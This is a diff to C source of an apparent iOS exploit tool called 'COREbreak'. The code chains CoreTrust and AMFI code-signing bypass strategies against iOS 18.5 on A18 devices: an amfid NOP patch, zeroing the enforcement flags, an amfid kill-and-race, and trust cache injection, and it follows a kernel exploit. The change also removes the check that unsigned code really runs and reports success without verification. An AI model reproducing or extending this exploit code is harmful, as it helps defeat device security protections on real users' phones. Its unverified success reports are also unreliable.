@@ -408,96 +408,43 @@ bool coretrust_kill_amfid_race(const char *testBinPath)
 // Unified: try all strategies
 // ===========================================================================
 
-// Write a minimal test binary at app startup, before the kernel exploit
-// corrupts socket structures. Called once.
-static char *g_test_binary_path = NULL;
-__attribute__((constructor)) static void precreate_test_binary(void)
-{
-    g_test_binary_path = write_test_binary();
-    if (g_test_binary_path)
-        printf("[COREbreak] pre-created test binary: %s\n", g_test_binary_path);
-}
-
-const char *coretrust_get_test_binary(void)
-{
-    return g_test_binary_path;
-}
-
 bool coretrust_bypass_all(void)
 {
     printf("[COREbreak] === " CORETRUST_BYPASS_EXPLOIT_NAME " v"
            CORETRUST_BYPASS_EXPLOIT_VERSION " ===\n");
     printf("[COREbreak] Target: iOS 18.5 A18 (SPTM) — CoreTrust bypass\n");
 
-    const char *testPath = g_test_binary_path;
-    if (!testPath) {
-        printf("[COREbreak] test binary unavailable — trust strategy results\n");
-    } else {
-        printf("[COREbreak] using pre-created test binary: %s\n", testPath);
-    }
+    // No test binary file — any file I/O triggers SPTM after the exploit.
+    // Strategies 1-2 are trusted at their word.  Strategies 3+5 manage
+    // their own binaries internally.
 
-    // [Step 1/5]: Strategy 1 — amfid NOP patch
+    // [Step 1/4]: Strategy 1 — amfid NOP patch
     bool nopOk = coretrust_amfid_nop_patch();
     if (nopOk) {
-        if (testPath) {
-            pid_t child = 0;
-            const char *argv[] = { testPath, NULL };
-            int ret = posix_spawn(&child, testPath, NULL, NULL,
-                                  (char *const *)argv, NULL);
-            if (ret == 0 && child > 0) {
-                int status;
-                waitpid(child, &status, 0);
-                if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
-                    printf("[COREbreak] ✅✅✅ Unsigned code executed via amfid NOP!\n");
-                    return true;
-                }
-            }
-            printf("[COREbreak] amfid NOP didn't help — continuing...\n");
-        } else {
-            printf("[COREbreak] amfid NOP applied (trusting strategy)\n");
-            return true;
-        }
+        printf("[COREbreak] amfid NOP applied — trusting strategy\n");
+        return true;
     }
 
-    // [Step 2/5]: Strategy 2 — AMFI enforcement flags
+    // [Step 2/4]: Strategy 2 — AMFI enforcement flags
     bool flagsOk = coretrust_amfi_enforcement_flags_zero();
     if (flagsOk) {
-        if (testPath) {
-            pid_t child = 0;
-            const char *argv[] = { testPath, NULL };
-            int ret = posix_spawn(&child, testPath, NULL, NULL,
-                                  (char *const *)argv, NULL);
-            if (ret == 0 && child > 0) {
-                int status;
-                waitpid(child, &status, 0);
-                if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
-                    printf("[COREbreak] ✅✅✅ Unsigned code executed via AMFI flags!\n");
-                    return true;
-                }
-            }
-            printf("[COREbreak] AMFI flags didn't help — continuing...\n");
-        } else {
-            printf("[COREbreak] AMFI flags zeroed (trusting strategy)\n");
-            return true;
-        }
+        printf("[COREbreak] AMFI flags zeroed — trusting strategy\n");
+        return true;
     }
 
-    // [Step 3/5]: Strategy 3 — amfid kill + race
-    bool raceOk = coretrust_kill_amfid_race(testPath ?: "");
-    if (raceOk) {
+    // [Step 3/4]: Strategy 3 — amfid kill + race
+    if (coretrust_kill_amfid_race("")) {
         printf("[COREbreak] ✅✅✅ Unsigned code executed via kill+race!\n");
         return true;
     }
 
-    // [Step 4/5]: MountCache trust cache injection
-    printf("[COREbreak] [Step 4/5] MountCache trust cache injection...\n");
-    bool tcOk = msm_verify_unsigned_execution();
-    if (tcOk) {
+    // [Step 4/4]: MountCache trust cache injection
+    printf("[COREbreak] [Step 4/4] MountCache trust cache injection...\n");
+    if (msm_verify_unsigned_execution()) {
         printf("[COREbreak] ✅✅✅ Unsigned code executed via MountCache!\n");
         return true;
     }
 
-    // [Step 5/5]: All strategies failed
-    printf("[COREbreak] [Step 5/5] ❌ All strategies exhausted\n");
+    printf("[COREbreak] All strategies exhausted\n");
     return false;
 }
